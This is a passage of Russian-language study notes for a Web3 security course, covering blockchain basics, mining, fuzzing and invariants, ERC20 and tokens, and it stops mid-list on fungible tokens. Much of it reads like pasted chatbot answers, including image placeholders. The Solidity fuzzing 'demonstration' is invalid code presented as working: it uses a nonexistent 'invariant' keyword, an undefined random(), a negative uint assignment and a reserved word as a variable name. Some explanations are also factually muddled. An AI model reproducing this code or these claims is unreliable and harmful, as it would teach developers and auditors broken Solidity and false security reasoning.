># <center>Section 1: Review | Основы<center>

![Poster](https://th.bing.com/th/id/OIG.YRcSw_QSSuTq34diyeRR?w=1024&h=1024&rs=1&pid=ImgDetMain)

>## <center>Полезные ссылки<center>
- [**Документация Solidity**](https://docs.soliditylang.org/en/v0.8.23/)
- [**Cheatsheet(шпаргалки) Solidity**](https://docs.soliditylang.org/en/v0.8.23/cheatsheet.html)
- [**Список значений двоичного кода EVM**](https://www.evm.codes/?fork=shanghai)
- [**Репозиторий для Lesson 10: ABI Encode от PatrickAlphaC**](https://github.com/PatrickAlphaC/hardhat-nft-fcc/blob/main/contracts/sublesson/Encoding.sol)
- [**Solidity с нуля**](https://solidity-by-example.org/)
>## <center>Пройденный материал:<center>

>## <center>Lesson 0: Prerequisites<center>
- [0. Что такое Web3?](#0-что-такое-web3)
- [0. Какие есть направления в Web3? Чем занимается Security and Auditing?](#0-какие-есть-направления-в-web3-чем-занимается-security-and-auditing)
- [0. Насколько важно хорошо понимать математику для Web3?](#0-насколько-важно-хорошо-понимать-математику-для-web3)
- [0. Что такое блокчейн?](#0-что-такое-блокчейн)
- [0. Как в Web3 достигается децентрализация?](#0-как-в-web3-достигается-децентрализация)
- [0. Какие базовые понятия Web3 следует знать?](#0-какие-базовые-понятия-web3-следует-знать)
- [0. Что такое смарт-контракт?](#0-что-такое-смарт-контракт)
- [0. Что такое криптография и что делает криптовалюту не просто валютой?](#0-что-такое-криптография-и-что-делает-криптовалюту-не-просто-валютой)
- [0. О каких конкретно математических задачах идёт речь в майнинге?](#0-о-каких-конкретно-математических-задачах-идёт-речь-в-майнинге)
>## <center>Lesson 1: Tooling Requisites<center>

>## <center>Lesson 2: Solidity Prerequisites<center>

>## <center>Lesson 3: Fuzzing and Invariants<center>
- [3. Что такое Fuzzing and invariants?](#3-что-такое-fuzzing-and-invariants)
- [3. Демонстрация fuzzing и Invariance на Solidity](#3-демонстрация-fuzzing-и-invariance-на-solidity)
  
>## <center>Lesson 4: Installing Libraries<center>

>## <center>Lesson 5: What is an ERC20?<center>

- [5. Что такое ERC20?](#5-что-такое-erc20)
- [5. Что такое токен?](#5-что-такое-токен)
- [5. Что значит взаимозаменяемый токен FT?](#5-что-значит-взаимозаменяемый-токен-ft)
- [5. Что такое экосистема Ethereum?](#5-что-такое-экосистема-ethereum)
  
>## <center>Lesson 6: What is an ERC721?<center>

- [6. Что такое ERC721?](#6-что-такое-erc721)
- [6. А что за протокол 1155?](#6-а-что-за-протокол-1155)
- [6. В чем разница между ERC20, ERC721 и ERC1155?](#6-в-чем-разница-между-erc20-erc721-и-erc1155)

>## <center>Lesson 7: Advanced Solidity Prerequisites<center>

- [7. Как перевести из десятичной в шестнадцатеричную(hexadecimal) систему счисления и обратно?](#7-как-перевести-из-десятичной-в-шестнадцатеричнуюhexadecimal-систему-счисления-и-обратно)
- [7. Какое число помещается в uint256 и как это посчитать?](#7-какое-число-помещается-в-uint256-и-как-это-посчитать)

>## <center>Lesson 8: Storage<center>

- [8. Что такое Storage в смарт-контрактах и как он работает?](#8-что-такое-storage-в-смарт-контрактах-и-как-он-работает)

>## <center>Lesson 9: Fallback and Receive<center>

- [9. Что такое fallback() и receive()?](#9-что-такое-fallback-и-receive)
- [9. Что за ключевые слова external payable?](#9-что-за-ключевые-слова-external-payable)
- [9. Что такое газ?](#9-что-такое-газ)

>## <center>Lesson 10: ABI encode<center>

- [10. Что за ключевое слово pragma в Solidity?](#10-что-за-ключевое-слово-pragma-в-solidity)
- [10. Практическая часть в Lesson 10](#10-практическая-часть-в-lesson-10)
- [10. Что означает public pure при объявлении функции внутри контракта?](#10-что-означает-public-pure-при-объявлении-функции-внутри-контракта)
- [10. Что означает returns(data\_type memory) при объявлении функции?](#10-что-означает-returnsdata_type-memory-при-объявлении-функции)
- [10. Что такое ABI (Application Binary Interface)?](#10-что-такое-abi-application-binary-interface)

>## <center>Lesson 11: Encoding Functions<center>

- [11. Что такое EVM (Ethereum Virtual Machine)?](#11-что-такое-evm-ethereum-virtual-machine)
- [11. Что такое CALLDATA?](#11-что-такое-calldata)

>## <center>Lesson 12: Upgradable Contracts<center>

>## <center>Lesson 13: Self Destruct<center>

- [13. Практическая часть в Lesson 13](#13-практическая-часть-в-lesson-13)

>## <center>Lesson 14: Fork Tests<center>
># <center>03 / 01 / 2024<center>

# 1. Что такое Web3?
Web3 — это концепция нового поколения интернета, который будет децентрализован и основан на блокчейне. В Web3 данные и приложения будут принадлежать и управляться пользователями, а не централизованными корпорациями.

Вот основные характеристики Web3:

* Децентрализация: данные и приложения не будут храниться на одном сервере или принадлежать одной компании. Вместо этого они будут распределены по сети компьютеров, принадлежащих пользователям. 

* Безопасность: данные в Web3 будут защищены от взлома и вмешательства со стороны третьих лиц.
* Прозрачность: пользователи будут иметь полный контроль над своими данными и приложениями.

Web3 все еще находится в стадии развития, но уже есть ряд проектов, которые реализуют эти концепции. Например, децентрализованные финансы (DeFi) позволяют пользователям осуществлять финансовые операции без посредников, а децентрализованные приложения (DApps) предоставляют пользователям возможность взаимодействовать друг с другом без необходимости доверять какой-либо третьей стороне.

Web3 может революционизировать интернет, сделав его более справедливым, безопасным и прозрачным.
# 2. Какие есть направления в Web3? Чем занимается Security and Auditing?
Вот некоторые из основных направлений в Web3:

* **Децентрализованные приложения (DApps)**: DApps - это приложения, которые работают на блокчейне. DApps не принадлежат какой-либо одной компании, а управляются сообществом пользователей.
* **Децентрализованные финансы (DeFi)**: DeFi - это финансовый сектор, который работает на блокчейне. DeFi позволяет пользователям осуществлять финансовые операции без посредников.
* **Децентрализованные идентификационные системы (DID)**: DID - это системы, которые позволяют пользователям контролировать свои цифровые идентичности. DID не зависят от централизованных организаций, что обеспечивает пользователям большую конфиденциальность и безопасность.
* **Смарт-контракты:** Смарт-контракты - это самоисполняющиеся контракты, которые записываются в блокчейне. Смарт-контракты могут использоваться для автоматизации различных задач, таких как управление активами, проведение транзакций и обеспечение безопасности.
* **NFT:** NFT - это невзаимозаменяемые токены, которые представляют собой уникальные цифровые активы. NFT могут использоваться для хранения различных активов, таких как произведения искусства, коллекционные предметы и игровые предметы.
* **Metaverse:** Метавселенная - это виртуальный мир, в котором люди могут взаимодействовать друг с другом и с цифровыми объектами. Метавселенная может использоваться для различных целей, таких как игры, общение и бизнес.

Security and Auditing - это направление, которое занимается безопасностью и аудитом Web3-приложений. Специалисты в этой области занимаются выявлением и устранением уязвимостей в DApps, DeFi-платформах, смарт-контрактах и других Web3-приложениях.

Вот некоторые из задач, которые решаются специалистами в области Security and Auditing:

* **Аудит безопасности:** Аудит безопасности - это процесс проверки безопасности Web3-приложения на предмет уязвимостей. Аудит безопасности может проводиться вручную или с помощью автоматизированных инструментов.
* **Тестирование безопасности:** Тестирование безопасности - это процесс выполнения тестов на безопасность Web3-приложения с целью выявления уязвимостей. Тестирование безопасности может проводиться с использованием различных методов, таких как fuzzing, статический анализ кода и динамический анализ кода.
* **Разработка рекомендаций по безопасности:** Специалисты в области Security and Auditing разрабатывают рекомендации по безопасности для Web3-приложений. Рекомендации по безопасности помогают разработчикам и владельцам приложений повысить уровень безопасности своих приложений.

Security and Auditing - это важное направление в Web3, поскольку безопасность является ключевым фактором для успеха Web3-приложений.
# 3. Насколько важно хорошо понимать математику для Web3? 
**Очень важно.**

Web3 - это область, которая основана на математике. Многие ключевые концепции Web3, такие как криптография, блокчейн и смарт-контракты, основаны на математических принципах.

Вот некоторые конкретные примеры того, как математика используется в Web3:

* **Криптография:** Криптография используется для обеспечения безопасности Web3-приложений. Криптографические алгоритмы используются для защиты данных, транзакций и аутентификации пользователей.
* **Блокчейн:** Блокчейн - это распределенная база данных, которая использует математику для обеспечения целостности и безопасности данных.
* **Смарт-контракты:** Смарт-контракты - это самоисполняющиеся контракты, которые записываются в блокчейне. Смарт-контракты используют математику для определения условий контракта и обеспечения их выполнения.

Разработчики и специалисты по безопасности Web3 должны хорошо понимать математику, чтобы понимать, как работают эти концепции и как их можно использовать для обеспечения безопасности и надежности Web3-приложений.

Вот некоторые конкретные математические концепции, которые важны для Web3:

* **Алгебра:** Алгебра используется для решения уравнений, неравенств и других задач.
* **Геометрия:** Геометрия используется для описания формы и положения объектов.
* **Комбинаторика:** Комбинаторика используется для подсчета числа возможных комбинаций объектов.
* **Теория вероятностей:** Теория вероятностей используется для расчета вероятности событий.
* **Криптография:** Криптография используется для обеспечения безопасности данных.
* **Алгоритмы:** Алгоритмы используются для решения задач.

Специалисты в области Security and Auditing должны также иметь хорошее понимание следующих математических концепций:

* **Теория чисел:** Теория чисел изучает свойства чисел.
* **Комбинаторная теория чисел:** Комбинаторная теория чисел изучает свойства чисел, которые возникают в комбинаторных задачах.
* **Алгебраическая криптография:** Алгебраическая криптография использует алгебраические методы для обеспечения безопасности.

Если вы хотите работать в области Web3, важно уделить время изучению математики. Это поможет вам понять, как работают Web3-приложения и как их можно использовать для обеспечения безопасности и надежности.
# 4. Что такое блокчейн?
Блокчейн - это цепочка блоков, каждый из которых содержит информацию о транзакциях. Блоки связаны между собой так, что изменить или удалить информацию в одном блоке невозможно, не изменив все последующие блоки.

Представьте, что у вас есть книга учета, в которую вы записываете все свои покупки. Когда вы покупаете что-то, вы вносите запись в книгу учета. Если вы хотите изменить или удалить запись, вам нужно изменить все последующие записи, чтобы они соответствовали новой информации.

Блокчейн работает по такому же принципу. Каждый блок содержит информацию о транзакции, а также ссылку на предыдущий блок. Чтобы изменить или удалить информацию в одном блоке, вам нужно изменить все последующие блоки. Это очень сложно сделать, поэтому блокчейн считается очень безопасной технологией.

Блокчейн можно использовать для различных целей, например, для хранения данных, проведения транзакций, обеспечения безопасности и прозрачности.

Вот несколько примеров того, как блокчейн используется в настоящее время:

* Криптовалюты, такие как биткойн, используют блокчейн для хранения информации о транзакциях.
* Децентрализованные приложения (DApps) используют блокчейн для обеспечения безопасности и прозрачности.
* Блокчейн используется для хранения медицинских данных, чтобы обеспечить конфиденциальность и безопасность пациентов.
* Блокчейн используется для хранения цепочек поставок, чтобы обеспечить прозрачность и эффективность.

Блокчейн - это новая технология с огромным потенциалом. Она может изменить способ хранения данных, проведения транзакций и обеспечения безопасности.
# 5. Как в Web3 достигается децентрализация?
Децентрализация в Web3 достигается за счет использования блокчейна. Блокчейн - это децентрализованная база данных, которая хранит информацию в виде цепочки блоков. Каждый блок содержит информацию о транзакции, а также ссылку на предыдущий блок.

Чтобы данные были децентрализованы в Web3, они должны храниться в блокчейне. Это означает, что они будут распределены по сети компьютеров, принадлежащих пользователям. Каждый компьютер в сети будет иметь копию блокчейна, что сделает данные недоступными для взлома или изменения со стороны одной стороны.

Вот как это работает:

1. Когда пользователь создает новый блок данных, он отправляет его в сеть.
2. Остальные компьютеры в сети проверяют новый блок и добавляют его в свой блокчейн.
3. Как только новый блок добавлен в блокчейн, он становится неизменным.

Этот процесс гарантирует, что данные в Web3 будут децентрализованы и доступны всем пользователям сети.

Вот несколько примеров того, как децентрализация может применяться в Web3:

* **Децентрализованные приложения (DApps)** - это приложения, которые работают на блокчейне. DApps не принадлежат какой-либо одной компании, а управляются сообществом пользователей.
* **Децентрализованные финансы (DeFi)** - это финансовый сектор, который работает на блокчейне. DeFi позволяет пользователям осуществлять финансовые операции без посредников.
* **Децентрализованные идентификационные системы (DID)** - это системы, которые позволяют пользователям контролировать свои цифровые идентичности. DID не зависят от централизованных организаций, что обеспечивает пользователям большую конфиденциальность и безопасность.

Децентрализация имеет ряд преимуществ, включая:

* **Безопасность:** децентрализованные системы более устойчивы к взломам и вмешательствам со стороны третьих лиц.
* **Прозрачность:** децентрализованные системы более прозрачны, поскольку все транзакции записываются в блокчейне.
* **Контроль:** пользователи имеют полный контроль над своими данными и приложениями в децентрализованных системах.

Однако децентрализация также имеет ряд недостатков, включая:

* **Скорость:** децентрализованные системы могут быть медленнее централизованных систем.
* **Сложность:** децентрализованные системы могут быть сложнее в использовании, чем централизованные системы.
* **Затраты:** децентрализованные системы могут быть дороже централизованных систем.

В целом, децентрализация - это перспективная технология, которая может изменить способ работы интернета. Однако децентрализация все еще находится в стадии развития, и есть ряд проблем, которые необходимо решить, прежде чем она сможет стать широко распространенной.

# 6. Какие базовые понятия Web3 следует знать?
Вот основные базовые понятия Web3, которые вам следует знать:

* **Блокчейн:** Блокчейн - это распределенная база данных, которая хранит информацию в виде цепочки блоков. Каждый блок содержит информацию о транзакции, а также ссылку на предыдущий блок.
* **Криптовалюты:** Криптовалюты - это цифровая валюта, которая защищена криптографией. Криптовалюты, такие как биткойн, используют блокчейн для хранения информации о транзакциях.
* **Децентрализованные приложения (DApps):** DApps - это приложения, которые работают на блокчейне. DApps не принадлежат какой-либо одной компании, а управляются сообществом пользователей.
* **Децентрализованные финансы (DeFi):** DeFi - это финансовый сектор, который работает на блокчейне. DeFi позволяет пользователям осуществлять финансовые операции без посредников.
* **Децентрализованные идентификационные системы (DID):** DID - это системы, которые позволяют пользователям контролировать свои цифровые идентичности. DID не зависят от централизованных организаций, что обеспечивает пользователям большую конфиденциальность и безопасность.

Вот некоторые другие понятия, которые вам могут быть интересны:

* **Смарт-контракты:** Смарт-контракты - это самоисполняющиеся контракты, которые записываются в блокчейне. Смарт-контракты могут использоваться для автоматизации различных задач, таких как управление активами, проведение транзакций и обеспечение безопасности.
* **NFT:** NFT - это невзаимозаменяемые токены, которые представляют собой уникальные цифровые активы. NFT могут использоваться для хранения различных активов, таких как произведения искусства, коллекционные предметы и игровые предметы.
* **Metaverse:** Метавселенная - это виртуальный мир, в котором люди могут взаимодействовать друг с другом и с цифровыми объектами. Метавселенная может использоваться для различных целей, таких как игры, общение и бизнес.

Web3 все еще находится в стадии развития, и появляются новые понятия и технологии с каждым днем. Чтобы оставаться в курсе последних событий, вы можете следить за новостями о Web3 в Интернете и на конференциях.

Вот несколько ресурсов, которые помогут вам узнать больше о Web3:

* **Сайт Ethereum:** Ethereum - это блокчейн, который используется для запуска DApps. Сайт Ethereum содержит множество ресурсов для изучения Web3.
* **Сайт Binance Academy:** Binance Academy - это образовательный ресурс, который предоставляет информацию о различных аспектах криптовалют и блокчейна.
* **Сайт CoinMarketCap:** CoinMarketCap - это веб-сайт, который отслеживает цены криптовалют. Сайт CoinMarketCap также предоставляет информацию о различных криптовалютах и блокчейнах.

Надеюсь, эта информация была вам полезна.

# 7. Что такое смарт-контракт?
**Смарт-контракт** - это компьютерная программа, которая хранится в блокчейне и выполняет определенные действия при выполнении определенных условий.

**Проще говоря, смарт-контракт - это своего рода договор, который заключен в цифровом виде.**

Например, вы можете использовать смарт-контракт для покупки дома. В этом случае смарт-контракт будет содержать все условия сделки, такие как цена дома, дата оплаты и т. д. Как только вы и продавец дома подпишете смарт-контракт, он будет выполнен автоматически, и дом перейдет в вашу собственность.

Смарт-контракты имеют ряд преимуществ перед традиционными договорами:

* **Прозрачность:** Смарт-контракты хранятся в блокчейне, который является публичной децентрализованной базой данных. Это означает, что любой может проверить условия смарт-контракта, чтобы убедиться, что они справедливы.
* **Безопасность:** Смарт-контракты выполняются на блокчейне, который является очень безопасной технологией. Это означает, что очень маловероятно, что смарт-контракт будет нарушен или изменен.
* **Автоматизация:** Смарт-контракты выполняются автоматически, как только выполняются определенные условия. Это устраняет необходимость в посредниках, таких как юристы или банкиры.

Смарт-контракты имеют потенциал для изменения многих отраслей, включая финансы, недвижимость, здравоохранение и многое другое.

**Почему смарт-контракт называется "контрактом"?**

Смарт-контракт называется "контрактом", потому что он выполняет ту же функцию, что и традиционный договор. Он определяет права и обязанности сторон сделки и обеспечивает выполнение этих прав и обязанностей.

**Почему смарт-контракт называется "умным"?**

Смарт-контракт называется "умным", потому что он способен выполнять свои функции автоматически, без вмешательства человека. Это достигается благодаря использованию технологии блокчейна.
# 8. Что такое криптография и что делает криптовалюту не просто валютой?
Криптография - это наука о зашифровании информации таким образом, чтобы ее можно было прочитать только с помощью специального ключа. Криптовалюты используют криптографию для защиты своих транзакций от взлома и подделки.

В случае криптовалюты криптография используется для двух основных целей:

* **Подтверждение транзакций:** Когда пользователь отправляет криптовалюту другому пользователю, транзакция должна быть подтверждена сетью. Это делается с помощью процесса, называемого майнингом. Майнеры используют свои компьютеры для решения сложных математических задач, которые подтверждают транзакции.
* **Защита от подделки:** Криптография также используется для защиты криптовалют от подделки. Каждый блок в блокчейне криптовалюты содержит хэш предыдущего блока. Хэш - это уникальная строка символов, которая создается для каждого блока. Если кто-то попытается изменить информацию в блоке, хэш изменится. Это позволит другим пользователям сети обнаружить изменение и отклонить транзакцию.

Вот некоторые конкретные примеры того, как криптография используется для защиты криптовалют:

* **Адреса кошельков:** Каждый кошелек криптовалюты имеет уникальный адрес. Этот адрес используется для отправки и получения криптовалюты. Адреса кошельков генерируются с помощью криптографии.
* **Подписи транзакций:** Каждая транзакция криптовалюты должна быть подписана отправителем. Подпись транзакции создается с помощью криптографии. Подпись позволяет сети подтвердить, что транзакция была отправлена ​​законным пользователем.
* **Майнинг:** Майнинг криптовалюты также использует криптографию. Майнеры используют свои компьютеры для решения сложных математических задач, которые подтверждают транзакции. Эти задачи основаны на криптографии.

Криптография является важной частью безопасности криптовалют. Она помогает защитить криптовалюты от взлома и подделки.
# 9. О каких конкретно математических задачах идёт речь в майнинге?
В майнинге криптовалюты используются различные математические задачи, но наиболее распространенной является задача нахождения хэша блока. Хэш - это уникальная строка символов, которая создается для каждого блока в блокчейне. Хэш блока рассчитывается с использованием алгоритма хеширования, такого как SHA-256.

Задача майнера состоит в том, чтобы найти хэш блока, который соответствует определенному критерию. Этот критерий называется целевым значением. Целевое значение обычно представляет собой очень большое число, которое начинается с нескольких нулей.

Майнер использует свой компьютер для перебора различных значений nonce. Ноnce - это переменная, которая используется для изменения хэша блока. Майнер продолжает перебирать значения nonce, пока не найдет хэш блока, который соответствует целевому значению.

Как только майнер находит хэш блока, который соответствует целевому значению, он сообщает его сети. Сеть добавляет блок в блокчейн и вознаграждает майнера криптовалютой.

Вот более подробный обзор математических задач, используемых в майнинге:

* **Хэширование:** Хэширование - это процесс преобразования данных в уникальную строку символов. Алгоритмы хеширования используются для обеспечения безопасности и целостности данных. В майнинге криптовалюты хэширование используется для создания уникального идентификатора для каждого блока в блокчейне.
* **Целевое значение:** Целевое значение - это очень большое число, которое начинается с нескольких нулей. Майнер должен найти хэш блока, который соответствует целевому значению.
* **Нонче:** Ноnce - это переменная, которая используется для изменения хэша блока. Майнер продолжает перебирать значения nonce, пока не найдет хэш блока, который соответствует целевому значению.

Майнинг криптовалюты - это сложный и ресурсоемкий процесс. Майнеры используют мощные компьютеры для решения сложных математических задач, которые подтверждают транзакции и добавляют новые блоки в блокчейн.
# 10. Что такое Fuzzing and invariants?
Fuzzing и invariants: тандем для защиты программ

**Fuzzing (Фаззинг)** и **invariants (инварианты)** - это мощные техники тестирования программ, часто используемые совместно для повышения защищенности и надежности систем. Давайте разберемся в каждой из них:

**Fuzzing** - это автоматизированный метод тестирования, при котором программе подаются на вход случайные или мутированные данные. Цель - обнаружить ошибки, сбои или неожиданное поведение, которые не проявляются при обычном тестировании с предопределенными данными. 

**Invariants** - это логические условия, которые всегда должны быть истинными на определенных точках программы. Например, инвариантом очереди может быть "очередь всегда пуста или содержит как минимум один элемент". Они помогают выявлять ошибки, приводящие к нарушению этих условий.

**Как они работают вместе?**

Во время фаззинга:

* Инварианты устанавливаются в ключевых точках программы.
* Генератор случайных данных создает тестовые входы.
* Программа выполняется с этими данными.
* Результаты сравниваются с инвариантами.
* Если инвариант нарушен, это указывает на потенциальную ошибку.

**Преимущества совместного использования:**

* **Улучшенное покрытие кода:** Fuzzing исследует широкий спектр возможных входов, повышая вероятность обнаружения скрытых ошибок.
* **Более эффективный поиск уязвимстей:** Инварианты направляют fuzzing на критические точки программы, где нарушения могут иметь серьезные последствия.
* **Обнаружение нетривиальных ошибок:** Не все ошибки проявляются очевидным образом. Инварианты помогают выявить тонкие ошибки, которые могли бы остаться незамеченными.

**Примеры использования:**

* Fuzzing и инварианты широко применяются в тестировании программного обеспечения, веб-приложений и смарт-контрактов.
* В области безопасности, они помогают находить уязвимости, связанные с переполнением буфера, инъекциями кода и другими атаками.

**Вывод:**

Fuzzing и invariants - сильные союзники в обеспечении программной безопасности и надежности. Совместное использование этих методов позволяет разработчикам и тестировщикам более эффективно выявлять ошибки и уязвимости, обеспечивая защиту программ от сбоев и атак.

Надеюсь, это объяснение было полезным! Если у вас есть дополнительные вопросы, не стесняйтесь спрашивать.

# 11. Демонстрация fuzzing и Invariance на Solidity
Хорошо, вот простой пример использования fuzzing и invariants в Solidity:

``` solidity
// Указание версии компилятора Solidity, который будет использоваться для компиляции этого контракта.
pragma solidity ^0.8.0;

// Объявление контракта с названием "Counter". Это похоже на определение класса в объектно-ориентированном программировании.
contract Counter {

 // Объявление переменной count, которая будет хранить значение счетчика. Она доступна для чтения всем участникам сети (public).
 uint256 public count;

 // Конструктор контракта, который выполняется один раз при создании контракта. Он инициализирует переменную count значением 0.
 constructor() {
   count = 0;
 }

 // Функция для увеличения значения счетчика на единицу. Она доступна для вызова всем участникам сети (public).
 function increment() public {
   count++;
 }

 // Функция для уменьшения значения счетчика на единицу. Она доступна для вызова всем участникам сети (public).
 function decrement() public {
   count--;
 }

 // Функция для получения текущего значения счетчика. Она доступна для вызова всем участникам сети (public) и не изменяет состояние контракта (view).
 function get() public view returns (uint256) {
   return count;
 }

 // Инвариант: значение count всегда должно быть больше или равно нулю. Это условие проверяется перед каждой операцией с контрактом, чтобы предотвратить ошибки.
 invariant (count >= 0);
}

```

Этот контракт представляет собой простой счетчик, который может увеличиваться или уменьшаться. Инвариант контракта гарантирует, что значение count всегда будет больше или равно нулю.

Вот пример того, как можно использовать fuzzing для тестирования этого контракта:

```solidity
// Импортируем другой контракт, который мы будем использовать в этом контракте.
import "./Counter.sol";

// Объявление контракта с названием "Fuzzer".
contract Fuzzer {

  // Объявление переменной counter, которая будет хранить экземпляр контракта Counter.
  Counter counter;

  // Конструктор контракта, который выполняется один раз при создании контракта. Он создает новый экземпляр контракта Counter.
  constructor() {
    counter = new Counter();
  }

  // Функция fuzz() для тестирования контракта Counter. Она доступна для вызова всем участникам сети (public).
  function fuzz() public {
    // Запускаем цикл, который повторяется 10000 раз.
    for (uint256 i = 0; i < 10000; i++) {
      // Генерируем случайное число от 0 до 1000000000.
      uint256 value = uint256(random(1000000000));

      // Проверяем, является ли случайное число четным или нечетным.
      if (value % 2 == 0) {
        // Если число четное, увеличиваем значение счетчика.
        counter.increment();
      } else {
        // Если число нечетное, уменьшаем значение счетчика.
        counter.decrement();
      }

      // Проверяем инвариант контракта Counter, чтобы убедиться, что значение счетчика не стало отрицательным.
      require(counter.get() >= 0);
    }
  }
}
```

Этот контракт использует функцию fuzz(), которая генерирует случайные значения и выполняет операции с счетчиком. Перед каждой операцией проверяется инвариант контракта. Если инвариант нарушен, это указывает на потенциальную ошибку.

Вот пример того, как можно использовать fuzzing для обнаружения ошибки в этом контракте:

```solidity
/// Генерируем значение, которое меньше нуля
// Это значение будет нарушено инвариантом контракта Counter.
uint256 value = -1;

// Выполняем операцию с счетчиком
// Эта операция также будет нарушена инвариантом контракта Counter.
counter.increment();

// Проверяем инвариант
// Эта проверка приведет к ошибке, поскольку значение счетчика будет меньше нуля.
require(counter.get() >= 0);

```

Эта операция приведет к нарушению инварианта, поскольку значение count будет меньше нуля. Это указывает на ошибку в контракте, которая может быть использована для взлома контракта.

Вот еще один пример, который демонстрирует, как fuzzing и инварианты могут использоваться для обнаружения ошибок в смарт-контрактах:

```solidity
// Указание версии компилятора Solidity, который будет использоваться для компиляции этого контракта.
pragma solidity ^0.8.0;

// Объявление контракта с названием "Library".
contract Library {

  // Функция foo(), которая принимает на вход число x и возвращает другое число.
  // Реализация функции не показана, но мы знаем, что она должна возвращать 0, если на вход ей подать 0.
  function foo(uint256 x) public returns (uint256) {
    // ...
  }

  // Инвариант: значение, возвращаемое функцией foo(0), всегда должно быть равно 0. Это условие проверяется перед каждой операцией с контрактом, чтобы предотвратить ошибки.
  invariant (foo(0) == 0);
}
```

Этот контракт предоставляет функцию foo(), которая возвращает значение x. Инвариант контракта гарантирует, что foo(0) всегда будет равно нулю.

Вот пример того, как можно использовать fuzzing для тестирования этого контракта:

``` solidity
// Импортируем другой контракт, который мы будем использовать в этом контракте.
import "./Library.sol";

// Объявление контракта с названием "Fuzzer".
contract Fuzzer {

 // Объявление переменной library, которая будет хранить экземпляр контракта Library.
 Library library;

 // Конструктор контракта, который выполняется один раз при создании контракта. Он создает новый экземпляр контракта Library.
 constructor() {
   library = new Library();
 }

 // Функция fuzz() для тестирования контракта Library. Она доступна для вызова всем участникам сети (public).
 function fuzz() public {
   // Запускаем цикл, который повторяется 10000 раз.
   for (uint256 i = 0; i < 10000; i++) {
     // Генерируем случайное число от 0 до 1000000000.
     uint256 value = uint256(random(1000000000));

     // Вызываем функцию foo() контракта Library с этим случайным числом и получаем результат.
     uint256 result = library.foo(value);

     // Проверяем инвариант контракта Library, чтобы убедиться, что результат функции foo(0) равен 0.
     require(result == 0);
   }
 }
}
```

Этот контракт использует функцию fuzz(), которая генерирует случайные значения и вызывает функцию foo() библиотеки. Перед каждой операцией проверяется инвариант контракта. Если инвариант нарушен, это указывает на потенциальную ошибку.

Вот пример того, как можно использовать fuzzing для обнаружения ошибки в этом контракте:

``` solidity
// Генерируем значение, которое не равно нулю
uint256 value = 1;

// Выполняем операцию с библиотекой
uint256 result = library.foo(value);

// Проверяем инвариант
require(result == 0);
```

Эта операция приведет к нарушению инварианта, поскольку значение result не будет равно нулю. Это указывает на ошибку в контракте, которая может быть использована для взлома контракта.

Как видите, fuzzing и инварианты - это мощные инструменты, которые могут помочь разработчикам и тестировщикам выявлять ошибки и уязвимости в смарт-контрактах.
# 12. Что такое ERC20?
ERC20 - это стандарт для смарт-контрактов на блокчейне Ethereum, который определяет общие свойства и функции для токенов. Эти свойства и функции позволяют токенам ERC20 взаимодействовать друг с другом и с другими приложениями в экосистеме Ethereum.

Проще говоря, ERC20 - это набор правил, которым должны соответствовать токены, чтобы быть взаимозаменяемыми и совместимыми друг с другом.

ERC20 назван в честь Ethereum Request for Comments (ERC), который является официальным протоколом, предназначенным для внесения предложений по улучшению сети Ethereum. ERC20 был предложен в 2015 году и быстро стал стандартом для токенов на Ethereum.

Вот некоторые из основных свойств и функций ERC20:

* **Передача:** Токены ERC20 могут быть переданы от одного адреса к другому.
* **Счет:** Каждый токен ERC20 имеет свой собственный счет, который отслеживает его баланс.
* **Сумма:** Каждый токен ERC20 имеет свою собственную сумму, которая может быть дробной.
* **Схожесть:** Все токены ERC20 являются взаимозаменяемыми, что означает, что один токен ERC20 можно обменять на другой токен ERC20 того же типа.

ERC20 является важным стандартом для Web3-разработчиков. Он позволяет создавать взаимозаменяемые и совместимые токены, которые могут использоваться в различных приложениях.

Вот несколько примеров того, как используются токены ERC20:

* **Стоимость:** Токены ERC20 могут использоваться для оплаты товаров и услуг.
* **Голосование:** Токены ERC20 могут использоваться для голосования за решения в децентрализованных организациях.
* **Игры:** Токены ERC20 могут использоваться в играх для покупки предметов или повышения уровня.

Если вы изучаете Web3-разработку, важно понимать стандарт ERC20. Это поможет вам создавать токены, которые будут совместимы с другими приложениями в экосистеме Ethereum.
# 13. Что такое токен?
Токен — это единица учёта, которая может представлять собой цифровой актив, такую как криптовалюта, или право на доступ к определённому сервису. Токены могут быть взаимозаменяемыми или не взаимозаменяемыми.

* **Взаимозаменяемые токены (FT)** — это токены, которые идентичны друг другу. Один FT можно заменить другим FT без потери ценности или уникальности. Примеры взаимозаменяемых токенов включают криптовалюты, такие как биткойн и эфир, а также токены доступа, такие как билеты на концерт или спортивные мероприятия.
[Image of Взаимозаменяемые токены (FT)]

* **Невзаимозаменяемые токены (NFT)** — это токены, которые уникальны и не могут быть заменены другими аналогичными токены. Примеры NFT включают произведения искусства, коллекционные предметы, игровые предметы и другие активы, которые имеют ценность из-за своей уникальности.
[Image of Невзаимозаменяемые токены (NFT)]

Токены могут использоваться в различных целях, включая:

* **Представление ценности:** Токены могут использоваться для представления ценности, например, в качестве валюты или ценных бумаг.
* **Предоставление доступа:** Токены могут использоваться для предоставления доступа к определённому сервису, например, к децентрализованному приложению или игре.
* **Представление права собственности:** Токены могут использоваться для представления права собственности на актив, например, на произведение искусства или коллекционный предмет.

Токены имеют ряд преимуществ, включая:

* **Прозрачность:** Токены хранятся в блокчейне, который является публичной децентрализованной базой данных. Это означает, что любой может проверить историю владения токеном.
* **Безопасность:** Токены защищены технологией блокчейна, которая является очень безопасной.
* **Автоматизация:** Токены могут использоваться для автоматизации различных задач, например, передачи денег или владения активами.

Токены являются быстро развивающейся технологией, которая имеет потенциал для изменения многих отраслей и сфер жизни.
# 14. Что значит взаимозаменяемый токен FT?
Взаимозаменяемый токен (fungible token) - это цифровой актив, который идентичен другому. Например, один биткойн взаимозаменяем с другим биткойном. Вы можете спокойно заменить один биткойн на другой без потери ценности или уникальности.

Взаимозаменяемые токены часто используются для представления цифровых валют, таких как биткойн, эфириум или тезер. Они также могут использоваться для представления других цифровых активов, таких как игровые предметы или токены доступа.

Вот несколько примеров взаимозаменяемых токенов:

* **Криптовалюты:** биткойн, эфириум, тезер
* **Игровые предметы:** оружие, броня, игровые персонажи
* **Токены доступа:** билеты на концерты, спортивные мероприятия, конференции

Взаимозаменяемые токены имеют ряд преимуществ:

* **Простота обмена:** взаимозаменяемые токены легко обмениваются друг на друга. Это делает их удобными для использования в качестве валюты или других цифровых активов.
* **Прозрачность:** взаимозаменяемые токены хранятся в блокчейне, что обеспечивает их прозрачность и безопасность.

Однако у взаимозаменяемых токенов есть и некоторые недостатки:

